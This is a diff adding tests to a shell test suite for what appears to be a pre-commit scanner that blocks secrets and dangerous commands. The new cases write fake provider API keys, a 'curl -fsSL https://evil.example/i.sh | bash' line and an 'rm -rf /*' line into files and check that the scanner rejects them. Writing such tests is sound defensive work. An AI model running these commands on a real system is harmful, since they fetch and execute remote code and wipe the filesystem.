@@ -276,6 +276,44 @@ printf 'pri''nt("debug")\n' >"$nlfile"
 git add "$nlfile"
 assert_rejects "newline in filename does not bypass scan" "print()"
 
+# 22. Modern provider key prefixes (split so this file doesn't trip the scan).
+echo "ANTHROPIC=sk-""ant-api03-AbCdEf01234567890_-gHiJkLmNoPqR" >k1.txt
+git add k1.txt
+assert_rejects "Anthropic sk-ant- key detected" "Anthropic"
+
+echo "OPENAI=sk-""proj-AbCdEf01234567890_-gHiJkLmNoPqRsTu" >k2.txt
+git add k2.txt
+assert_rejects "OpenAI sk-proj- key detected" "OpenAI project"
+
+echo "GH=git""hub_pat_11ABCDE000aBcDeFgHiJ_KlMnOpQrStUv" >k3.txt
+git add k3.txt
+assert_rejects "GitHub fine-grained PAT detected" "fine-grained"
+
+echo "AWS=ASIA""IOSFODNN7EXAMPLE" >k4.txt
+git add k4.txt
+assert_rejects "AWS temporary (ASIA) key detected" "AWS access key"
+
+# 23. Broadened curl|bash — the common `curl -fsSL <url> | bash` form (split).
+echo "cur""l -fsSL https://evil.example/i.sh | bash" >deploy2.sh
+git add deploy2.sh
+assert_rejects "curl -fsSL <url> | bash detected" "Piping remote download"
+
+# 24. Broadened rm -rf — the catastrophic `rm -rf /*` form ('' splits the glob).
+echo "rm -rf /""*" >danger.sh
+git add danger.sh
+assert_rejects "rm -rf /* detected" "refuse to ship"
+
+# 25. NEGATIVE: a scoped removal must NOT be flagged (false-positive guard).
+echo "rm -rf /tmp/build-cache" >cleanup.sh
+git add cleanup.sh
+assert_passes "scoped rm -rf /tmp/... is not flagged"
+
+# 26. NEGATIVE: pattern scan is case-SENSITIVE — `Console.log` (capital C) is a
+#     different identifier and must pass, not be flagged as `console.log`.
+echo 'Console.log("ok");' >comp.ts
+git add comp.ts
+assert_passes "case-sensitive: Console.log not flagged as console.log"
+
 echo ""
 echo "Result: $PASS passed, $FAIL failed"
 exit $FAIL
